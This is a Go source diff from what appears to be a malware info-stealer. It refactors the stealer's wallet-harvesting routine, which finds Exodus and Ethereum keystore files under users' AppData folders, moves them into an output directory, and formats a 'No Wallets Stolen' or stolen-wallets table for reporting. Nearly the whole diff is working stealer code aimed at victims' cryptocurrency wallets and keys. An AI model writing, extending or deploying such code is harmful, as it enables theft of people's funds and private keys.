@@ -6,6 +6,7 @@
 package main
 
 import (
+	"time"
 	"bytes"
 	"fmt"
 	"os"
@@ -13,7 +14,7 @@ import (
 	"strings"
 )
 
-type WalletPath struct {
+type Wallet struct {
 	Name      string
 	Location  string
 	Query     string
@@ -22,13 +23,9 @@ type WalletPath struct {
 	FilesExtracted []File
 }
 
-type Wallets struct {
-	Paths []WalletPath
-}
-
-func FormatWalletsStolen(paths []WalletPath) string {
-	// Format the available wallet paths for embed
-	if CountExtracted(paths) == 0 {
+func FormatWalletsStolen(wallets []Wallet) string {
+	// Format the available wallets for embed
+	if CountExtracted(wallets) == 0 {
 		return "No Wallets Stolen"
 	}
 
@@ -40,7 +37,7 @@ func FormatWalletsStolen(paths []WalletPath) string {
 	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "------", "------", "------", "-----"))
 
 	// Iterate through each path and write its attributes to the table
-	for _, path := range paths {
+	for _, path := range wallets {
 		var filesExtractedStr = "None"
 		if len(path.FilesExtracted) > 0 {
 			filesExtractedStr = fmt.Sprint(len(path.FilesExtracted))
@@ -56,7 +53,7 @@ func FormatWalletsStolen(paths []WalletPath) string {
 	return buffer.String()
 }
 
-func CountExtracted(paths []WalletPath) (count int) {
+func CountExtracted(paths []Wallet) (count int) {
 	// Return a count of the number of extracted wallet paths using a simple iterator
 	for _, path := range paths {
 		if path.Extracted {
@@ -68,16 +65,16 @@ func CountExtracted(paths []WalletPath) (count int) {
 }
 
 func (stealer *Stealer) GetWallets() {
-	// Get all available and useful wallet files from each popular CryptoCurrency Wallet
-	paths := walletPaths
+	defer TimeTrack(time.Now())
 
-	for i, path := range paths {
+	// Get all available and useful wallet files from each popular CryptoCurrency Wallet
+	for i, path := range wallets {
 		// If the path exists, copy all of its useful files into the Output directory
 		walletFiles := GetFiles(path.Location)
 
 		if len(walletFiles) != 0 {
-			paths[i].Exists = true
-			paths[i].FilesExtracted = make([]File, len(walletFiles))
+			wallets[i].Exists = true
+			wallets[i].FilesExtracted = make([]File, len(walletFiles))
 
 			var walletPath = outputPath + "\\" + path.Name
 			if os.Mkdir(walletPath, 0666) != nil {
@@ -86,26 +83,26 @@ func (stealer *Stealer) GetWallets() {
 
 			for _, file := range walletFiles {
 				if len(path.Query) > 0 && !strings.Contains(file.Name, path.Query) {
-					// not developed yet (Bytecoin / Armory section)
+					// Bytecoin / Armory stealing functionality will go here
 					continue
 				}
 
 				filePath := walletPath + "\\" + file.Name
 				if file.Move(filePath) {
-					paths[i].FilesExtracted = append(paths[i].FilesExtracted, file)
+					wallets[i].FilesExtracted = append(wallets[i].FilesExtracted, file)
 				}
 			}
 
-			if len(paths[i].FilesExtracted) > 0 {
-				paths[i].Extracted = true
+			if len(wallets[i].FilesExtracted) > 0 {
+				wallets[i].Extracted = true
 			}
 		}
 	}
 
-	stealer.Apps.Wallets.Paths = paths
+	stealer.Apps.Wallets = wallets
 }
 
-var walletPaths = []WalletPath{
+var wallets = []Wallet{
 	{
 		Name:     "Exodus",
 		Location: "\\AppData\\Roaming\\Exodus\\exodus.wallet\\",
@@ -118,14 +115,14 @@ var walletPaths = []WalletPath{
 		Name:     "Ethereum",
 		Location: "\\AppData\\Roaming\\Ethereum\\keystore\\",
 	},
-	{
-		Name:     "Armory",
-		Location: "\\AppData\\Roaming\\Armory\\",
-		Query:    "wallet",
-	},
-	{
-		Name:     "Bytecoin",
-		Location: "\\AppData\\Roaming\\bytecoin\\",
-		Query:    "wallet",
-	},
+	// {
+	// 	Name:     "Armory",
+	// 	Location: "\\AppData\\Roaming\\Armory\\",
+	// 	Query:    "wallet",
+	// },
+	// {
+	// 	Name:     "Bytecoin",
+	// 	Location: "\\AppData\\Roaming\\bytecoin\\",
+	// 	Query:    "wallet",
+	// },
 }
